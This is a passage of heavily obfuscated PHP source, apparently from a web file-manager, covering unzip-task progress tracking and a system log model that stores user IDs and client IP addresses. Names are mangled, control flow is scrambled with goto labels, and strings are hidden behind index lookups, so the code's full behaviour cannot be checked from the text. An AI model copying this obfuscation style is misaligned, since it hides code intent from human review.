$_SERVER[œº]; $FË¯“§ô°‹ =& $this->task; if (!$FË¯“§ô°‹[$fÙÖºËÁÂ[1021]] || !$FË¯“§ô°‹[$fÙÖºËÁÂ[723]]) { return; } if ($FË¯“§ô°‹[$fÙÖºËÁÂ[1613]] == $fÙÖºËÁÂ[1094]) { $A´ˆßîÑïÓ = 0; if ($FË¯“§ô°‹[$fÙÖºËÁÂ[1572]]) { $A´ˆßîÑïÓ = $FË¯“§ô°‹[$fÙÖºËÁÂ[1573]] / $FË¯“§ô°‹[$fÙÖºËÁÂ[1572]]; } $FË¯“§ô°‹[$fÙÖºËÁÂ[1529]] = $A´ˆßîÑïÓ * 0.3; } else { if ($FË¯“§ô°‹[$fÙÖºËÁÂ[1613]] == $fÙÖºËÁÂ[311]) { $A´ˆßîÑïÓ = $FË¯“§ô°‹[$fÙÖºËÁÂ[1036]] / $FË¯“§ô°‹[$fÙÖºËÁÂ[1021]]; $FË¯“§ô°‹[$fÙÖºËÁÂ[1529]] = 0.3 + $A´ˆßîÑïÓ * 0.4; } else { if ($FË¯“§ô°‹[$fÙÖºËÁÂ[1613]] == $fÙÖºËÁÂ[107]) { $E¬Êìˆ±óÃ = 0; if ($FË¯“§ô°‹[$fÙÖºËÁÂ[1574]] == $fÙÖºËÁÂ[107]) { $E¬Êìˆ±óÃ = $FË¯“§ô°‹[$fÙÖºËÁÂ[1573]]; } $A´ˆßîÑïÓ = ($FË¯“§ô°‹[$fÙÖºËÁÂ[1577]] + $E¬Êìˆ±óÃ) / $FË¯“§ô°‹[$fÙÖºËÁÂ[723]]; $FË¯“§ô°‹[$fÙÖºËÁÂ[1529]] = 0.3 + 0.4 + $A´ˆßîÑïÓ * 0.3; } } } if ($FË¯“§ô°‹[$fÙÖºËÁÂ[1529]] > 0) { $bºÅ‰…Ëªï = timeFloat() - $FË¯“§ô°‹[$fÙÖºËÁÂ[749]] - $FË¯“§ô°‹[$fÙÖºËÁÂ[1532]]; $FË¯“§ô°‹[$fÙÖºËÁÂ[1533]] = $bºÅ‰…Ëªï * (1 - $FË¯“§ô°‹[$fÙÖºËÁÂ[1529]]) / $FË¯“§ô°‹[$fÙÖºËÁÂ[1529]]; } } public function addFile($FÛšõÁá£Å) { goto d«ã–©À—ê; Cåã™±éê÷: $Añº¦¾¯Î[$CÖ¼ä£ñŠÊ[1023]] = $CÖ¼ä£ñŠÊ[1589]; $Añº¦¾¯Î[$CÖ¼ä£ñŠÊ[1574]] = $CÖ¼ä£ñŠÊ[1094]; $Añº¦¾¯Î[$CÖ¼ä£ñŠÊ[723]] = $CƒÆäôÅÓ»[$CÖ¼ä£ñŠÊ[78]]; goto e»Ğ‚»±ê; fÈñæíÎÃ·: $Añº¦¾¯Î[$CÖ¼ä£ñŠÊ[1570]] = $CƒÆäôÅÓ»[$CÖ¼ä£ñŠÊ[28]]; $Añº¦¾¯Î[$CÖ¼ä£ñŠÊ[1572]] = $CƒÆäôÅÓ»[$CÖ¼ä£ñŠÊ[78]]; $Añº¦¾¯Î[$CÖ¼ä£ñŠÊ[1573]] = 0; goto Cåã™±éê÷; e»Ğ‚»±ê: $Añº¦¾¯Î[$CÖ¼ä£ñŠÊ[1021]] = 1; $DÖÄî´¥ = 0; $Añº¦¾¯Î[$CÖ¼ä£ñŠÊ[1581]] = array($CÖ¼ä£ñŠÊ[1582] => $DÖÄî´¥ + 1, $CÖ¼ä£ñŠÊ[413] => $CƒÆäôÅÓ»[$CÖ¼ä£ñŠÊ[28]], $CÖ¼ä£ñŠÊ[76] => $CƒÆäôÅÓ»[$CÖ¼ä£ñŠÊ[76]], $CÖ¼ä£ñŠÊ[495] => $CƒÆäôÅÓ»[$CÖ¼ä£ñŠÊ[495]] ? $CƒÆäôÅÓ»[$CÖ¼ä£ñŠÊ[495]] : $CƒÆäôÅÓ»[$CÖ¼ä£ñŠÊ[76]]); goto C¥îõáé­›; d«ã–©À—ê: $CÖ¼ä£ñŠÊ =& $_SERVER[œº]; $Añº¦¾¯Î =& $this->task; $CƒÆäôÅÓ» = IO::info($FÛšõÁá£Å); goto fÈñæíÎÃ·; C¥îõáé­›: $this->update(); goto BŞ–”§“­§; BŞ–”§“­§: } public function unzipAfter($a…Áäçğ) { goto dØóéîŒ±; f—¤Ô’‚©: $EÒò–â´[$C£å“Ò™°[1036]] = 0; $EÒò–â´[$C£å“Ò™°[1572]] = 0; $EÒò–â´[$C£å“Ò™°[1573]] = 0; goto c²Û‰øõÎİ; dØóéîŒ±: $C£å“Ò™° =& $_SERVER[œº]; $EÒò–â´ =& $this->task; $EÒò–â´[$C£å“Ò™°[1613]] = $C£å“Ò™°[107]; goto BØ¹Ÿ‚ˆˆœ; EÕŠ¤ê †: $this->update(); self::log($C£å“Ò™°[1615] . json_encode(array($EÒò–â´, $Dõ²æ©Ç‡â))); goto D‹Ç¡•”¢Ø; BØ¹Ÿ‚ˆˆœ: $Dõ²æ©Ç‡â = IO::infoWithChildren($a…Áäçğ); $c½ğ•¯ºãÖ = 0; $EÒò–â´[$C£å“Ò™°[1581]] = array($C£å“Ò™°[1582] => $c½ğ•¯ºãÖ + 1, $C£å“Ò™°[413] => $Dõ²æ©Ç‡â[$C£å“Ò™°[28]], $C£å“Ò™°[76] => $Dõ²æ©Ç‡â[$C£å“Ò™°[76]], $C£å“Ò™°[495] => $Dõ²æ©Ç‡â[$C£å“Ò™°[495]] ? $Dõ²æ©Ç‡â[$C£å“Ò™°[495]] : $Dõ²æ©Ç‡â[$C£å“Ò™°[76]]); goto bŒ”â¬²¼‡; c²Û‰øõÎİ: $EÒò–â´[$C£å“Ò™°[1570]] = $C£å“Ò™°[33]; $EÒò–â´[$C£å“Ò™°[1577]] = 0; $EÒò–â´[$C£å“Ò™°[723]] = $Dõ²æ©Ç‡â[$C£å“Ò™°[78]]; goto EÕŠ¤ê †; bŒ”â¬²¼‡: if ($Dõ²æ©Ç‡â[$C£å“Ò™°[29]] == $C£å“Ò™°[193]) { $EÒò–â´[$C£å“Ò™°[1021]] = 1; } else { $EÒò–â´[$C£å“Ò™°[1021]] = $Dõ²æ©Ç‡â[$C£å“Ò™°[81]][$C£å“Ò™°[79]]; } $EÒò–â´[$C£å“Ò™°[1023]] = $C£å“Ò™°[33]; $EÒò–â´[$C£å“Ò™°[1574]] = 0; goto f—¤Ô’‚©; D‹Ç¡•”¢Ø: } public function nameParse($føê•àç¯ø) { goto d÷¢”ë£Î¼; d÷¢”ë£Î¼: $eµ…¨ßÀ”â =& $_SERVER[œº]; $eå©æÅ—È =& $this->task; if ($eå©æÅ—È[$eµ…¨ßÀ”â[1613]] == $eµ…¨ßÀ”â[1094]) { $eå©æÅ—È[$eµ…¨ßÀ”â[1613]] = $eµ…¨ßÀ”â[311]; $eå©æÅ—È[$eµ…¨ßÀ”â[1577]] = 0; $eå©æÅ—È[$eµ…¨ßÀ”â[723]] = 0; } goto DŸ¯Éà‹·‰; DŸ¯Éà‹·‰: $a©ÄİßŒ‰ = get_path_this($føê•àç¯ø); if (strstr($a©ÄİßŒ‰, $eµ…¨ßÀ”â[95])) { $eå©æÅ—È[$eµ…¨ßÀ”â[1036]] += 1; $eå©æÅ—È[$eµ…¨ßÀ”â[1021]] += 1; } $eå©æÅ—È[$eµ…¨ßÀ”â[1570]] = $føê•àç¯ø; goto dÚæ’ŒíªÖ; dÚæ’ŒíªÖ: $this->update(); goto CçšÖ÷ïŒ‘; CçšÖ÷ïŒ‘: } } goto CÓ‘±áµ÷ˆ; eˆŒÀ¼Áˆ: class SystemLightAppModel extends ModelBaseLight { public $optionType = "\123\171\163\x74\x65\x6d\x2e\114\151\147\150\164\x41\160\160"; public $modelType = "\123\x79\163\164\145\155\x4f\x70\x74\151\157\x6e"; public $field = array("\156\141\155\x65", "\147\162\157\x75\x70", "\x64\145\x73\143", "\x63\157\156\164\x65\156\164"); public function listData($bÅøÑçä˜¯ = false, $Då×Š‘Š’ï = "\155\x6f\x64\x69\x66\x79\x54\x69\x6d\x65", $F¡Š²„°’Ò = true) { return parent::listData($bÅøÑçä˜¯, $Då×Š‘Š’ï, $F¡Š²„°’Ò); } public function remove($BÁ¸ÜÀì°ó) { $BäÛÕÈ­©… = $this->findByName($BÁ¸ÜÀì°ó); if (!$BäÛÕÈ­©…) { return !1; } return parent::remove($BäÛÕÈ­©…[$_SERVER[œº][393]]); } public function add($D…²æÚ·‡·) { if ($this->findByName($D…²æÚ·‡·[$_SERVER[œº][28]])) { return !1; } return parent::insert($D…²æÚ·‡·); } public function update($bËµ¼áøÚ¯, $bñ÷–˜ó¨™) { $B©–Á­…£“ =& $_SERVER[œº]; $fÉóˆƒÇÕ = $this->findByName($bËµ¼áøÚ¯); $DšÛšî†ƒ  = $this->findByName($bñ÷–˜ó¨™[$B©–Á­…£“[28]]); if (!$fÉóˆƒÇÕ || $DšÛšî†ƒ  && $DšÛšî†ƒ [$B©–Á­…£“[393]] != $fÉóˆƒÇÕ[$B©–Á­…£“[393]]) { return !1; } return parent::update($fÉóˆƒÇÕ[$B©–Á­…£“[393]], $bñ÷–˜ó¨™); } } class SystemLogModel extends ModelBase { protected $tableName = "\x73\x79\163\x74\x65\x6d\137\x6c\157\x67"; protected $dataAuto = array(array("\x63\162\145\x61\x74\145\x54\151\155\x65", "\164\151\155\145", "\x69\x6e\x73\x65\162\164", "\x66\165\156\143\164\151\157\x6e")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->typeListAll(); } public function typeListAll() { $cÎ¶»¥„Ü =& $_SERVER[œº]; return array($cÎ¶»¥„Ü[2004] => LNG($cÎ¶»¥„Ü[2005]), $cÎ¶»¥„Ü[2006] => LNG($cÎ¶»¥„Ü[2007]), $cÎ¶»¥„Ü[1632] => LNG($cÎ¶»¥„Ü[2008]), $cÎ¶»¥„Ü[2009] => LNG($cÎ¶»¥„Ü[2010]), $cÎ¶»¥„Ü[2011] => LNG($cÎ¶»¥„Ü[2012]), $cÎ¶»¥„Ü[2013] => LNG($cÎ¶»¥„Ü[2014]), $cÎ¶»¥„Ü[2015] => LNG($cÎ¶»¥„Ü[2016]), $cÎ¶»¥„Ü[1662] => LNG($cÎ¶»¥„Ü[2016]), $cÎ¶»¥„Ü[1663] => LNG($cÎ¶»¥„Ü[2017]), $cÎ¶»¥„Ü[2018] => LNG($cÎ¶»¥„Ü[2019]), $cÎ¶»¥„Ü[2020] => LNG($cÎ¶»¥„Ü[2021]), $cÎ¶»¥„Ü[2022] => LNG($cÎ¶»¥„Ü[2023]), $cÎ¶»¥„Ü[2024] => LNG($cÎ¶»¥„Ü[2025]), $cÎ¶»¥„Ü[1660] => LNG($cÎ¶»¥„Ü[2026]), $cÎ¶»¥„Ü[2027] => LNG($cÎ¶»¥„Ü[2028]), $cÎ¶»¥„Ü[1667] => LNG($cÎ¶»¥„Ü[2029]), $cÎ¶»¥„Ü[2030] => LNG($cÎ¶»¥„Ü[2031]), $cÎ¶»¥„Ü[2032] => LNG($cÎ¶»¥„Ü[2033]), $cÎ¶»¥„Ü[2034] => LNG($cÎ¶»¥„Ü[2035]), $cÎ¶»¥„Ü[2036] => LNG($cÎ¶»¥„Ü[2037]), $cÎ¶»¥„Ü[1670] => LNG($cÎ¶»¥„Ü[2038]), $cÎ¶»¥„Ü[1671] => LNG($cÎ¶»¥„Ü[2039]), $cÎ¶»¥„Ü[2040] => LNG($cÎ¶»¥„Ü[2041]), $cÎ¶»¥„Ü[2042] => LNG($cÎ¶»¥„Ü[2043]), $cÎ¶»¥„Ü[2044] => LNG($cÎ¶»¥„Ü[2045]), $cÎ¶»¥„Ü[1665] => LNG($cÎ¶»¥„Ü[2046]), $cÎ¶»¥„Ü[2047] => LNG($cÎ¶»¥„Ü[2048]), $cÎ¶»¥„Ü[1664] => LNG($cÎ¶»¥„Ü[2049]), $cÎ¶»¥„Ü[2050] => LNG($cÎ¶»¥„Ü[2051]), $cÎ¶»¥„Ü[2052] => LNG($cÎ¶»¥„Ü[2053]), $cÎ¶»¥„Ü[2054] => LNG($cÎ¶»¥„Ü[2055]), $cÎ¶»¥„Ü[2056] => LNG($cÎ¶»¥„Ü[2056]), $cÎ¶»¥„Ü[2057] => LNG($cÎ¶»¥„Ü[1636]), $cÎ¶»¥„Ü[2058] => LNG($cÎ¶»¥„Ü[2059]), $cÎ¶»¥„Ü[2060] => LNG($cÎ¶»¥„Ü[2061]), $cÎ¶»¥„Ü[2062] => LNG($cÎ¶»¥„Ü[2063]), $cÎ¶»¥„Ü[2064] => LNG($cÎ¶»¥„Ü[2065]), $cÎ¶»¥„Ü[2066] => LNG($cÎ¶»¥„Ü[2067]), $cÎ¶»¥„Ü[2068] => LNG($cÎ¶»¥„Ü[2068]), $cÎ¶»¥„Ü[2069] => LNG($cÎ¶»¥„Ü[2070]), $cÎ¶»¥„Ü[2071] => LNG($cÎ¶»¥„Ü[2072]), $cÎ¶»¥„Ü[2073] => LNG($cÎ¶»¥„Ü[2074]), $cÎ¶»¥„Ü[2075] => LNG($cÎ¶»¥„Ü[2076]), $cÎ¶»¥„Ü[2077] => LNG($cÎ¶»¥„Ü[2078]), $cÎ¶»¥„Ü[2079] => LNG($cÎ¶»¥„Ü[2080])); } private function typeFile() { $BµÌê¢¨ğœ =& $_SERVER[œº]; $C¹ìÖ†é·™ = array($BµÌê¢¨ğœ[1667] => array($BµÌê¢¨ğœ[1668]), $BµÌê¢¨ğœ[2022] => array($BµÌê¢¨ğœ[2081]), $BµÌê¢¨ğœ[2024] => array($BµÌê¢¨ğœ[2082]), $BµÌê¢¨ğœ[1660] => array($BµÌê¢¨ğœ[1661]), $BµÌê¢¨ğœ[2032] => array(), $BµÌê¢¨ğœ[2034] => array(), $BµÌê¢¨ğœ[2036] => array(), $BµÌê¢¨ğœ[1670] => array($BµÌê¢¨ğœ[1672]), $BµÌê¢¨ğœ[1671] => array($BµÌê¢¨ğœ[1672]), $BµÌê¢¨ğœ[2040] => array($BµÌê¢¨ğœ[2083]), $BµÌê¢¨ğœ[2042] => array($BµÌê¢¨ğœ[2083]), $BµÌê¢¨ğœ[2044] => array($BµÌê¢¨ğœ[2084]), $BµÌê¢¨ğœ[2030] => array($BµÌê¢¨ğœ[2085]), $BµÌê¢¨ğœ[1665] => array($BµÌê¢¨ğœ[2086]), $BµÌê¢¨ğœ[2047] => array($BµÌê¢¨ğœ[2087]), $BµÌê¢¨ğœ[1664] => array($BµÌê¢¨ğœ[1666])); return $C¹ìÖ†é·™; } private function typeAll() { goto a¾Úõ„Ã‹; dš†æøñºî: return $BÜ¡»ë ´Ñ; goto E†êë¸”ÌÈ; a¾Úõ„Ã‹: $BÂöª£¬â =& $_SERVER[œº]; $BÜ¡»ë ´Ñ = $this->typeList; $aÊëÓÑ²á“ = array_filter($this->typeFile()); goto A‚¤Î”‹¡¿; A‚¤Î”‹¡¿: foreach ($aÊëÓÑ²á“ as $eãÄ‚‰ĞÙ => $dÀßÛÔÎØ¸) { $BÜ¡»ë ´Ñ[$dÀßÛÔÎØ¸[0]] = $BÜ¡»ë ´Ñ[$eãÄ‚‰ĞÙ]; } $BÜ¡»ë ´Ñ[$BÂöª£¬â[1672]] = LNG($BÂöª£¬â[2088]); $BÜ¡»ë ´Ñ[$BÂöª£¬â[2083]] = LNG($BÂöª£¬â[2089]); goto dš†æøñºî; E†êë¸”ÌÈ: } public function addLog($A£¦­„Š›Æ, $f®ò¢‚¡Ê– = array()) { goto C“‡ëˆÚÂ; C“‡ëˆÚÂ: $AÎÇ³Ê–Û† =& $_SERVER[œº]; if (!isset($this->typeList[$A£¦­„Š›Æ])) { return; } $E‘Ÿ„˜œó = defined($AÎÇ³Ê–Û†[454]) && USER_ID ? USER_ID : (isset($f®ò¢‚¡Ê–[$AÎÇ³Ê–Û†[1528]]) ? $f®ò¢‚¡Ê–[$AÎÇ³Ê–Û†[1528]] : 0); goto C©¼Ÿó‰éƒ; Côñ©™ŸÔ“: $f®ò¢‚¡Ê– = array($AÎÇ³Ê–Û†[1519] => Session::sign(), $AÎÇ³Ê–Û†[1520] => $E‘Ÿ„˜œó, $AÎÇ³Ê–Û†[29] => $A£¦­„Š›Æ, $AÎÇ³Ê–Û†[1522] => json_encode($f®ò¢‚¡Ê–)); parent::add($f®ò¢‚¡Ê–); goto AÛùÚ¥øÌ…; C©¼Ÿó‰éƒ: if (!$E‘Ÿ„˜œó) { $E‘Ÿ„˜œó = (int) Session::get($AÎÇ³Ê–Û†[1818]); } $DØóìïš”‚ = get_client_ip(); if (!$f®ò¢‚¡Ê– || strlen(json_encode($f®ò¢‚¡Ê–)) >= 1024) { $f®ò¢‚¡Ê– = array($AÎÇ³Ê–Û†[2090] => $DØóìïš”‚); } else { if (is_array($f®ò¢‚¡Ê–)) { $f®ò¢‚¡Ê–[$AÎÇ³Ê–Û†[2090]] = $DØóìïš”‚; } else { $f®ò¢‚¡Ê– = array($AÎÇ³Ê–Û†[1088] => $f®ò¢‚¡Ê–, $AÎÇ³Ê–Û†[2090] => $DØóìïš”‚); } } goto Côñ©™ŸÔ“; AÛùÚ¥øÌ…: } public function remove($A¶â„ô£) { $this->where(array($_SERVER[œº][412] => $A¶â„ô£))->delete(); } private function _makeOrder($A¾ßÚùÏƒ’ = '') { goto bŒ¿ëëİ¯¾; e¥ˆªã¾¹: $däğ¼‡ ©í = Input::get($d¼æ‚÷İ[436], $d¼æ‚÷İ[7], $d¼æ‚÷İ[1850], array($d¼æ‚÷İ[1774], $d¼æ‚÷İ[430])); $däğ¼‡ ©í = $dç¢¦µ”ßô[$däğ¼‡ ©í]; $A¾ßÚùÏƒ’ = $A¾ßÚùÏƒ’ . "{$DÒê‘îª—ê}\40{$däğ¼‡ ©í}"; goto c½ÓíùĞÌÌ; bŒ¿ëëİ¯¾: $d¼æ‚÷İ =& $_SERVER[œº]; $DÒê‘îª—ê = $d¼æ‚÷İ[194]; $dç¢¦µ”ßô = array($d¼æ‚÷İ[428] => $d¼æ‚÷İ[429], $d¼æ‚÷İ[430] => $d¼æ‚÷İ[431]); goto e¥ˆªã¾¹; c½ÓíùĞÌÌ: return $this->order($A¾ßÚùÏƒ’); goto a£ªôÍ«»İ; a£ªôÍ«»İ: } public function get($CíêŠ©ÏÛ¶ = '') { goto Eƒ·ƒŸêŒÖ; eİÚöğ‰´‹: if (!empty($CíêŠ©ÏÛ¶[$E˜—¸„Ï¦[2090]])) { $Bœ¾¬½Ã[$E˜—¸„Ï¦[431]] = array($E˜—¸„Ï¦[380], "\x25{$CíêŠ©ÏÛ¶[$E˜—¸„Ï¦[2090]]}\x25"); } $b§ÆÑË› = $this->_makeOrder()->where($Bœ¾¬½Ã)->selectPage(); if (empty($b§ÆÑË›[$E˜—¸„Ï¦[367]])) { show_json(array(), !0, $b§ÆÑË›[$E˜—¸„Ï¦[364]]); } goto c¡«†å°³À; Eƒ·ƒŸêŒÖ: $E˜—¸„Ï¦ =& $_SERVER[œº]; if (!$CíêŠ©ÏÛ¶) { show_json(array()); } $Bœ¾¬½Ã = array(); goto bô½Ğå…¸ƒ; c¡«†å°³À: $b§ÆÑË›[$E˜—¸„Ï¦[367]] = $this->logList($b§ÆÑË›[$E˜—¸„Ï¦[367]]); return $b§ÆÑË›; goto CÂ¿Ø„Ç¶¤; bô½Ğå…¸ƒ: if ($CíêŠ©ÏÛ¶[$E˜—¸„Ï¦[1528]]) { $Bœ¾¬½Ã[$E˜—¸„Ï¦[1528]] = $CíêŠ©ÏÛ¶[$E˜—¸„Ï¦[1528]]; } if (isset($CíêŠ©ÏÛ¶[$E˜—¸„Ï¦[721]])) { $CŒÔÕ…¹‡Ö = $CíêŠ©ÏÛ¶[$E˜—¸„Ï¦[721]]; $e‰Ä„›Û´ = isset($CíêŠ©ÏÛ¶[$E˜—¸„Ï¦[476]]) ? $CíêŠ©ÏÛ¶[$E˜—¸„Ï¦[476]] : time(); $Bœ¾¬½Ã[$E˜—¸„Ï¦[194]] = array($E˜—¸„Ï¦[331], array($CŒÔÕ…¹‡Ö, $e‰Ä„›Û´)); } if ($CíêŠ©ÏÛ¶[$E˜—¸„Ï¦[29]]) { $A„¿³£Œ§É = explode($E˜—¸„Ï¦[47], $CíêŠ©ÏÛ¶[$E˜—¸„Ï¦[29]]); $F‰é¡¥İÊ = $this->typeFile(); $c®–íÛØÂ = array(); foreach ($A„¿³£Œ§É as $C–Ìæ‚ï³) { $c®–íÛØÂ[] = $C–Ìæ‚ï³; if (isset($F‰é¡¥İÊ[$C–Ìæ‚ï³])) { $c®–íÛØÂ = array_merge($c®–íÛØÂ, $F‰é¡¥İÊ[$C–Ìæ‚ï³]); } } $c®–íÛØÂ = array_unique($c®–íÛØÂ); if ($c®–íÛØÂ) { $Bœ¾¬½Ã[$E˜—¸„Ï¦[29]] = array($E˜—¸„Ï¦[7], $c®–íÛØÂ); } } else { $Bœ¾¬½Ã[$E˜—¸„Ï¦[29]] = array($E˜—¸„Ï¦[2091], $E˜—¸„Ï¦[2092]); } goto eİÚöğ‰´‹; CÂ¿Ø„Ç¶¤: } private function ipAddress(&$CÊÆÀòõ…Á) { $f…‡íó¦ =& $_SERVER[œº]; if (!empty($CÊÆÀòõ…Á[$f…‡íó¦[2090]])) { $D‰±ë¤İøã = IpLocation::get($CÊÆÀòõ…Á[$f…‡íó¦[2090]]); } else { $D‰±ë¤İøã = LNG($f…‡íó¦[2093]); } $CÊÆÀòõ…Á[$f…‡íó¦[2094]] = $D‰±ë¤İøã; } private function descZipDownload($C¸ ÷Âš»÷, &$f³ŒØ¾É…¼) { $CïØÉªÌ¹µ =& $_SERVER[œº]; if (!isset($C¸ ÷Âš»÷[$CïØÉªÌ¹µ[2095]])) { return; } $f•÷šğœÊÅ = json_decode($C¸ ÷Âš»÷[$CïØÉªÌ¹µ[2095]], !0); foreach ($f•÷šğœÊÅ as $F­——•ÜèŞ) { try { $e«‹›‡— = IO::infoFull($F­——•ÜèŞ[$CïØÉªÌ¹µ[76]]); } catch (Exception $Bç–¨øÃœ) { continue; } $C¸ ÷Âš»÷[$CïØÉªÌ¹µ[76]] = $F­——•ÜèŞ[$CïØÉªÌ¹µ[76]]; $f³ŒØ¾É…¼[] = $C¸ ÷Âš»÷[$CïØÉªÌ¹µ[395]] = $e«‹›‡—[$CïØÉªÌ¹µ[395]]; $f³ŒØ¾É…¼[] = $C¸ ÷Âš»÷[$CïØÉªÌ¹µ[1906]] = $e«‹›‡—[$CïØÉªÌ¹µ[478]]; break; } return $C¸ ÷Âš»÷; } private function getSourceList(&$cœïÎÕ½œò) { $E°·‡Ù¬‚¼ =& $_SERVER[œº]; $dğÄºªùö = array(); foreach ($cœïÎÕ½œò as $añâôéôŒ => $A–”¨Õ¶»ù) { goto Fµ¬¸ÚÁ¤; Fµ¬¸ÚÁ¤: $FÆõõèÔĞŸ = json_decode($A–”¨Õ¶»ù[$E°·‡Ù¬‚¼[431]], !0); if ($A–”¨Õ¶»ù[$E°·‡Ù¬‚¼[29]] == $E°·‡Ù¬‚¼[1663]) { $FÆõõèÔĞŸ = $this->descZipDownload($FÆõõèÔĞŸ, $dğÄºªùö); $cœïÎÕ½œò[$añâôéôŒ][$E°·‡Ù¬‚¼[431]] = json_encode($FÆõõèÔĞŸ); continue; } if (strpos($A–”¨Õ¶»ù[$E°·‡Ù¬‚¼[29]], $E°·‡Ù¬‚¼[1907]) !== 0) { if (!isset($FÆõõèÔĞŸ[$E°·‡Ù¬‚¼[76]]) || strpos($A–”¨Õ¶»ù[$E°·‡Ù¬‚¼[29]], $E°·‡Ù¬‚¼[2096]) !== 0) { continue; } try { $DÌ›•ƒ‰™Ø = IO::infoFull($FÆõõèÔĞŸ[$E°·‡Ù¬‚¼[76]]); } catch (Exception $eô’¬ É·Ë) { continue; } $dğÄºªùö[] = $FÆõõèÔĞŸ[$E°·‡Ù¬‚¼[395]] = $DÌ›•ƒ‰™Ø[$E°·‡Ù¬‚¼[395]]; $dğÄºªùö[] = $FÆõõèÔĞŸ[$E°·‡Ù¬‚¼[1906]] = $DÌ›•ƒ‰™Ø[$E°·‡Ù¬‚¼[478]]; $cœïÎÕ½œò[$añâôéôŒ][$E°·‡Ù¬‚¼[431]] = json_encode($FÆõõèÔĞŸ); continue; } goto A®ÒÂÅ¨ñø; A®ÒÂÅ¨ñø: $dğÄºªùö[] = $FÆõõèÔĞŸ[$E°·‡Ù¬‚¼[395]]; $dğÄºªùö[] = $FÆõõèÔĞŸ[$E°·‡Ù¬‚¼[1906]]; if ($FÆõõèÔĞŸ[$E°·‡Ù¬‚¼[29]] == $E°·‡Ù¬‚¼[520]) { $dğÄºªùö[] = $FÆõõèÔĞŸ[$E°·‡Ù¬‚¼[431]][$E°·‡Ù¬‚¼[1055]]; $dğÄºªùö[] = $FÆõõèÔĞŸ[$E°·‡Ù¬‚¼[431]][$E°·‡Ù¬‚¼[1056]]; } goto CªäàÓ‡À; CªäàÓ‡À: if ($FÆõõèÔĞŸ[$E°·‡Ù¬‚¼[29]] == $E°·‡Ù¬‚¼[1914]) { $dğÄºªùö[] = $FÆõõèÔĞŸ[$E°·‡Ù¬‚¼[431]][$E°·‡Ù¬‚¼[395]]; } goto C’ƒ±óøÈ—; C’ƒ±óøÈ—: } if (!$dğÄºªùö) { return array(); } return Model($E°·‡Ù¬‚¼[790])->sourceListInfo($dğÄºªùö, !0); } private function logList($AĞùÉÀùæ) { goto a”í®ÀâÊ; a…“ÔÁ‚‚: return $Fß£ë–¹Ò‡; goto E¦ÆÁ¼­ê; aÍïèõ‘âÔ: $D“÷ÑØ¾™ = array(); foreach ($AĞùÉÀùæ as $d·§ÄŒÅ§ß => $c¼·›—©õ) { goto Aª„ÒªÊ; EŸ‚É‰³¿: $c¼·›—©õ[$c‘‰¬Ç³¯[1849]] = $eĞ¥êŠ¼; $F¸¶“£Èó = json_decode($c¼·›—©õ[$c‘‰¬Ç³¯[431]], !0); $c¼·›—©õ[$c‘‰¬Ç³¯[2090]] = isset($F¸¶“£Èó[$c‘‰¬Ç³¯[2090]]) ? $F¸¶“£Èó[$c‘‰¬Ç³¯[2090]] : $c‘‰¬Ç³¯[33]; goto e•Ìõãë½ö; bæÊ¥íĞ: unset($c¼·›—©õ[$c‘‰¬Ç³¯[2099]]); $Fß£ë–¹Ò‡[] = $c¼·›—©õ; goto fëŒ«‘’ÖÚ; eÅòóßØÉ: $c¼·›—©õ[$c‘‰¬Ç³¯[28]] = isset($eĞ¥êŠ¼[$c‘‰¬Ç³¯[28]]) ? $eĞ¥êŠ¼[$c‘‰¬Ç³¯[28]] : LNG($c‘‰¬Ç³¯[2093]); $c¼·›—©õ[$c‘‰¬Ç³¯[1956]] = isset($eĞ¥êŠ¼[$c‘‰¬Ç³¯[1956]]) ? $eĞ¥êŠ¼[$c‘‰¬Ç³¯[1956]] : $c‘‰¬Ç³¯[33]; $c¼·›—©õ[$c‘‰¬Ç³¯[1432]] = isset($D—…ÃÌƒè[$CÌï¢£ŒÅ‘]) ? $D—…ÃÌƒè[$CÌï¢£ŒÅ‘] : $E¿‡âÁ²ˆÜ; goto EŸ‚É‰³¿; Aª„ÒªÊ: $CÌï¢£ŒÅ‘ = $c¼·›—©õ[$c‘‰¬Ç³¯[29]]; $eĞ¥êŠ¼ = isset($bÈ¦Ğ•áÏÚ[$c¼·›—©õ[$c‘‰¬Ç³¯[1528]]]) ? $bÈ¦Ğ•áÏÚ[$c¼·›—©õ[$c‘‰¬Ç³¯[1528]]] : !1; $E¿‡âÁ²ˆÜ = strpos($CÌï¢£ŒÅ‘, $c‘‰¬Ç³¯[2097]) === 0 ? LNG($c‘‰¬Ç³¯[2098]) : LNG($c‘‰¬Ç³¯[2093]); goto eÅòóßØÉ; e•Ìõãë½ö: $this->ipAddress($c¼·›—©õ); if (strpos($CÌï¢£ŒÅ‘, $c‘‰¬Ç³¯[1907]) === 0 || isset($F¸¶“£Èó[$c‘‰¬Ç³¯[1906]])) { goto cìŞ¼Úé…ƒ; F¾·¤—¬å…: if ($F¸¶“£Èó[$c‘‰¬Ç³¯[29]] == $c‘‰¬Ç³¯[1914]) { $F¸¶“£Èó[$c‘‰¬Ç³¯[431]][$c‘‰¬Ç³¯[395]] = $A‚È¾Ê­„[$F¸¶“£Èó[$c‘‰¬Ç³¯[431]][$c‘‰¬Ç³¯[395]]]; } if ($F¸¶“£Èó[$c‘‰¬Ç³¯[29]] == $c‘‰¬Ç³¯[1658]) { $F¸¶“£Èó[$c‘‰¬Ç³¯[1919]] = $F¸¶“£Èó[$c‘‰¬Ç³¯[85]]; $F¸¶“£Èó[$c‘‰¬Ç³¯[1906]] = $F¸¶“£Èó[$c‘‰¬Ç³¯[1919]][$c‘‰¬Ç³¯[395]]; $F¸¶“£Èó[$c‘‰¬Ç³¯[85]] = !1; $F¸¶“£Èó[$c‘‰¬Ç³¯[395]] = $c‘‰¬Ç³¯[33]; } if ($F¸¶“£Èó[$c‘‰¬Ç³¯[85]] && $F¸¶“£Èó[$c‘‰¬Ç³¯[85]][$c‘‰¬Ç³¯[404]] == $c‘‰¬Ç³¯[1171]) { $D“÷ÑØ¾™[] = $c¼·›—©õ[$c‘‰¬Ç³¯[393]]; unset($AĞùÉÀùæ[$d·§ÄŒÅ§ß]); continue; } goto Dºš“¹’™ï; Dºš“¹’™ï: if ($F¸¶“£Èó[$c‘‰¬Ç³¯[1919]] && $F¸¶“£Èó[$c‘‰¬Ç³¯[1919]][$c‘‰¬Ç³¯[404]] == $c‘‰¬Ç³¯[1171]) { $D“÷ÑØ¾™[] = $c¼·›—©õ[$c‘‰¬Ç³¯[393]]; unset($AĞùÉÀùæ[$d·§ÄŒÅ§ß]); continue; } goto fà”—–ˆËÄ; cìŞ¼Úé…ƒ: 